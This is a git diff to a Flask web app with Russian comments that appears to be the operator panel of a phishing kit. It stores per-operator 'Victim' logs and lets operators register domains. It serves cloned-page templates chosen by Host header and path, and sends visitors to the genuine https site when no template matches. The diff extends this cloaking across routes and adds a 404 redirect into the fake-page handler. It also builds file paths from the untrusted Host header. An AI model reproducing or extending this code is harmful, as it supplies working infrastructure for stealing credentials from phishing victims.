@@ -8,7 +8,7 @@ import json
 import os
 import re
 from datetime import datetime
-from config import salt
+from config import salt, server_domain
 
 
 db = User('./users.db', 'users')
@@ -31,9 +31,11 @@ def is_valid_domain(domain):
 
 
 
-
-
-
+@app.before_request
+def enforce_https():
+    if request.headers.get('X-Forwarded-Proto', 'http') == 'http':
+        https_url = request.url.replace('http://', 'https://', 1)
+        return redirect(https_url, code=301)
 
 
 
@@ -42,12 +44,26 @@ def is_valid_domain(domain):
 @app.route('/')
 def index():
     domain = request.headers.get('Host')
-    print(domain)
-    if domain == 'depian.ru':
+    
+    if domain == server_domain:
         return redirect(url_for('panel'))
     else:
-        username = os.listdir(f'domains/{domain}/')[0]
-        return render_template(f'domains/{domain}/{username}')
+        try:
+            path = request.args.get('path', None)
+            url = domain + '$' + path
+            username = os.listdir(f'templates/domains/{url}/')[0]
+            return render_template(f'domains/{url}/{username}')
+        except:
+            return redirect("https://" + domain)
+
+
+
+
+
+
+
+
+
 ###########################################
 #                                         #
 #                  Вход                   #
@@ -55,49 +71,62 @@ def index():
 ###########################################
 @app.route('/login', methods=['POST', 'GET'])
 def login():
-    if request.method == 'POST':
-    # Если был POST запрос
-        user = db.GetUserBy('username', request.form['username'])
-        admin_data = db.GetAdmins(request.form['username'])
-        pwd = salt+request.form['password']
-        if request.form['username'] == admin_data[0] and admin_data[1] == sha256(pwd.encode('utf-8')).hexdigest():
-            # Если это админ
-            session['username'] = request.form['username']
-            return redirect(url_for('panel', username=request.form['username']))
-        elif user and check_password_hash(user[0][2], request.form['password']):
-            # Если правильные данные
-            session['username'] = request.form['username']
-            if not user[0][5]:
-                if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
-                    ipaddress = request.environ['REMOTE_ADDR']
-                else:
-                    ipaddress = request.environ['HTTP_X_FORWARDED_FOR']
-                    
-                r = requests.get('http://ip-api.com/json/' + ipaddress)
-                ipdata = json.loads(r.text)
+    domain = request.headers.get('Host')
+    if domain == server_domain:
+        if request.method == 'POST':
+        # Если был POST запрос
+            user = db.GetUserBy('username', request.form['username'])
+            admin_data = db.GetAdmins(request.form['username'])
+            pwd = salt+request.form['password']
+            if request.form['username'] == admin_data[0] and admin_data[1] == sha256(pwd.encode('utf-8')).hexdigest():
+                # Если это админ
+                session['username'] = request.form['username']
+                return redirect(url_for('panel', username=request.form['username']))
+            elif user and check_password_hash(user[0][2], request.form['password']):
+                # Если правильные данные
+                session['username'] = request.form['username']
+                if not user[0][5]:
+                    if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
+                        ipaddress = request.environ['REMOTE_ADDR']
+                    else:
+                        ipaddress = request.environ['HTTP_X_FORWARDED_FOR']
+                        
+                    r = requests.get('http://ip-api.com/json/' + ipaddress)
+                    ipdata = json.loads(r.text)
 
-                if ipdata['status'] == 'success':
-                    data = [
-                        ['ip', ipaddress],
-                        ['city', ipdata['city']],
-                        ['country', ipdata['country']],
-                        ['updated_on', datetime.utcnow()]
-                    ]
-                    db.UpdateUser(data, 'username', request.form['username'])
-                    
-            return redirect(url_for('panel', username=request.form['username']))
+                    if ipdata['status'] == 'success':
+                        data = [
+                            ['ip', ipaddress],
+                            ['city', ipdata['city']],
+                            ['country', ipdata['country']],
+                            ['updated_on', datetime.utcnow()]
+                        ]
+                        db.UpdateUser(data, 'username', request.form['username'])
+                        
+                return redirect(url_for('panel', username=request.form['username']))
+            else:
+                # Если данные неверные
+                flash(('Неверные данные', 'error'))
+                return render_template('login.html', login=True)
         else:
-            # Если данные неверные
-            flash(('Неверные данные', 'error'))
-            return render_template('login.html', login=True)
+        # Если был GET запрос
+            # Если есть сессия
+            if 'username' in session:
+                return redirect(url_for('panel'))
+            else:
+                # Если нет сессии
+                return render_template('login.html')
     else:
-    # Если был GET запрос
-        # Если есть сессия
-        if 'username' in session:
-            return redirect(url_for('panel'))
-        else:
-            # Если нет сессии
-            return render_template('login.html')
+        try:
+            path = request.args.get('path', None)
+            url = domain + '$' + request.path.replace('/', '')
+            if path:
+                url = domain + '$' + path
+            username = os.listdir(f'templates/domains/{url}/')[0]
+            return render_template(f'domains/{url}/{username}')
+        except:
+            return redirect("https://" + domain)
+    
 
 
 ###########################################
@@ -107,32 +136,45 @@ def login():
 ###########################################
 @app.route('/panel', methods=['POST', 'GET'])
 def panel():
-    global db
+    domain = request.headers.get('Host')
+    if domain == server_domain:
+        global db
 
-    username = request.form.get('username')
-    admin = None
-    logs = None
+        username = request.form.get('username')
+        admin = None
+        logs = None
 
-    if 'username' in session:
-        username = session['username']
+        if 'username' in session:
+            username = session['username']
+        else:
+            return redirect(url_for('login'))
+        
+
+        if username == db.GetAdmins(session['username'])[0]:
+            admin = True
+            if request.args.get('users_manage'):
+                users = db.GetAllUsers()
+                return render_template('users_manage.html', admin=admin, users=users)
+
+
+        if not admin:
+            db_victim = Victim(f'./users/{username}/database.db')
+            logs = db_victim.GetLogs()
+            if logs:
+                logs = logs[0]
+
+        return render_template('index.html', username=username, admin=admin, logs=logs)
     else:
-        return redirect(url_for('login'))
+        try:
+            path = request.args.get('path', None)
+            url = domain + '$' + request.path.replace('/', '')
+            if path:
+                url = domain + '$' + path
+            username = os.listdir(f'templates/domains/{url}/')[0]
+            return render_template(f'domains/{url}/{username}')
+        except:
+            return redirect("https://" + domain)
     
-
-    if username == db.GetAdmins(session['username'])[0]:
-        admin = True
-        if request.args.get('users_manage'):
-            users = db.GetAllUsers()
-            return render_template('users_manage.html', admin=admin, users=users)
-
-
-    if not admin:
-        db_victim = Victim(f'./users/{username}/database.db')
-        logs = db_victim.GetLogs()
-        if logs:
-            logs = logs[0]
-
-    return render_template('index.html', username=username, admin=admin, logs=logs)
 
 
 ###########################################
@@ -235,15 +277,26 @@ def edit_user():
 ###########################################
 @app.route('/domains', methods=['GET'])
 def domains():
-    if 'username' in session:
-        username = session['username']
+    domain = request.headers.get('Host')
+    if domain == server_domain:
+        if 'username' in session:
+            username = session['username']
+        else:
+            return redirect(url_for('login'))
+
+        db_victim = Victim(f'./users/{username}/database.db')
+        domains = db_victim.GetDomains()
+
+        return render_template('domains.html', domains=domains)
     else:
-        return redirect(url_for('login'))
+        try:
+            path = request.args.get('path', None)
+            url = domain + '$' + path
+            username = os.listdir(f'templates/domains/{url}/')[0]
+            return render_template(f'domains/{url}/{username}')
+        except:
+            return redirect("https://" + domain)
 
-    db_victim = Victim(f'./users/{username}/database.db')
-    domains = db_victim.GetDomains()
-
-    return render_template('domains.html', domains=domains)
 
 
 
@@ -266,10 +319,6 @@ def add_domain():
             return jsonify({'status': 'error', 'message': 'Неверно заполнена форма'})
         else:
             if is_valid_domain(domain):
-
-                
-
-
                 return jsonify({'status': 'success', 'message': 'Успешно добавлен домен'})
             else:
                 return jsonify({'status': 'error', 'message': 'Неверный домен, домен должен быть первого уровня и без протоколов'})
@@ -282,6 +331,17 @@ def add_domain():
 
 
 
+###########################################
+#                                         #
+#                Редирект                 #
+#                                         #
+###########################################
+@app.errorhandler(404)
+def page_not_found(e):
+    return redirect(url_for('index', path=request.path.replace('/', '')))
+
+
+
 
 
 ###########################################
@@ -289,7 +349,7 @@ def add_domain():
 #                  Выход                  #
 #                                         #
 ###########################################
-@app.route('/logout')
+@app.route('/logout', methods=['POST'])
 def logout():
     if 'username' in session and session['username'] != db.GetAdmins(session['username'])[0]:
         user = db.GetUserBy('username', session['username'])[0]
